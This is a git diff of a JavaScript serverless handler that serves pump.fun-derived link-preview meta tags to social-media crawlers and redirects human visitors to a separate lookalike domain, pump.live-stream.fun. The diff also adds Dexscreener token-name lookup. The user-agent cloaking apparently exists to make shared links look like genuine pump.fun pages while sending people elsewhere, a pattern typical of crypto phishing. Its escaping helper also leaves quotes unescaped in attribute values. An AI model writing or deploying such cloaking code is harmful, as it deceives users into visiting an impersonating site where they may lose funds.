@@ -1,6 +1,30 @@
 export default async function handler(req, res) {
-  let ca = req.query.address || req.url.slice(1).split('?')[0];
-  if (!ca || ca.length < 30) return res.status(400).send('Bad address');
+  let input = req.query.address || req.url.slice(1).split('?')[0];
+  if (!input) return res.status(400).send('Missing address');
+
+  let ca = input;
+
+  // Detect if NOT a contract address → resolve via Dexscreener
+  if (input.length < 30) {
+    try {
+      const searchRes = await fetch(`https://api.dexscreener.com/latest/dex/search?q=${encodeURIComponent(input)}`);
+      const searchData = await searchRes.json();
+
+      // Pick best match (Solana + highest market cap)
+      const pair = searchData?.pairs
+        ?.filter(p => p.chainId === "solana")
+        ?.sort((a, b) => (b.marketCap || 0) - (a.marketCap || 0))[0];
+
+      if (!pair || !pair.baseToken?.address) {
+        return res.status(404).send('Token not found');
+      }
+
+      ca = pair.baseToken.address;
+    } catch (err) {
+      console.error("Dexscreener resolve error:", err);
+      return res.status(500).send('Failed to resolve token');
+    }
+  }
 
   // Check if it's a Twitter bot
   const userAgent = req.headers['user-agent'] || '';
@@ -9,54 +33,44 @@ export default async function handler(req, res) {
                        userAgent.includes('Slackbot') ||
                        userAgent.includes('LinkedInBot');
 
-  // For Twitter bots: serve meta tags
   if (isTwitterBot) {
     try {
-      // Fetch the Pump.fun page
       const response = await fetch(`https://pump.fun/coin/${ca}`, {
         headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Twitterbot/1.0)' }
       });
+
       const html = await response.text();
-      
-      // Extract title
+
       let title = html.match(/<title>(.*?)<\/title>/)?.[1] || 'Token on Pump.Fun';
-      
-      // Extract image - MULTIPLE FALLBACKS for new/unpopular coins
+
       let img = null;
-      
-      // Method 1: Look for og:image meta tag
+
       const ogImageMatch = html.match(/<meta property="og:image" content="([^"]+)"/);
       if (ogImageMatch) img = ogImageMatch[1];
-      
-      // Method 2: Look for token image in the page (works for new coins)
+
       if (!img) {
         const tokenImageMatch = html.match(/<img[^>]+src="([^"]+token[^"]+\.(?:png|jpg|jpeg|gif))"/i);
         if (tokenImageMatch) img = tokenImageMatch[1];
       }
-      
-      // Method 3: Look for any large image on the page
+
       if (!img) {
         const anyImageMatch = html.match(/<img[^>]+src="([^"]+)"[^>]*>/i);
         if (anyImageMatch) img = anyImageMatch[1];
       }
-      
-      // Method 4: Use default Pump.fun logo as last resort
+
       if (!img) img = 'https://pump.fun/logo.png';
-      
-      // Ensure image URL is absolute
+
       if (img && img.startsWith('/')) {
         img = `https://pump.fun${img}`;
       }
-      
-      // Extract description
+
       let description = html.match(/<meta property="og:description" content="([^"]+)"/)?.[1] || '';
       if (!description) {
         const marketCapMatch = html.match(/\$?([\d.]+[KM]?)\s*(?:market cap|MC)/i);
         if (marketCapMatch) description = `Market Cap: $${marketCapMatch[1]} | Buy on Pump.fun`;
         else description = 'New token on Pump.fun';
       }
-      
-      // Send the response with meta tags
+
       res.send(`<!DOCTYPE html>
       <html><head>
         <meta property="og:title" content="${escapeHtml(title)}" />
@@ -75,7 +89,6 @@ export default async function handler(req, res) {
         <p>Redirecting...</p>
       </body></html>`);
     } catch (error) {
-      // Fallback for any errors
       res.send(`<!DOCTYPE html>
       <html><head>
         <meta property="og:title" content="Token on Pump.Fun" />
@@ -86,13 +99,11 @@ export default async function handler(req, res) {
       </head><body></body></html>`);
     }
   } else {
-    // FOR HUMANS: Redirect to your domain with JUST the CA (no /token/)
-    // CHANGE THIS URL TO YOUR DOMAIN
+    // Humans → redirect with resolved CA
     res.redirect(302, `https://pump.live-stream.fun/${ca}`);
   }
 }
 
-// Helper function to prevent HTML injection
 function escapeHtml(str) {
   return str.replace(/[&<>]/g, function(m) {
     if (m === '&') return '&amp;';
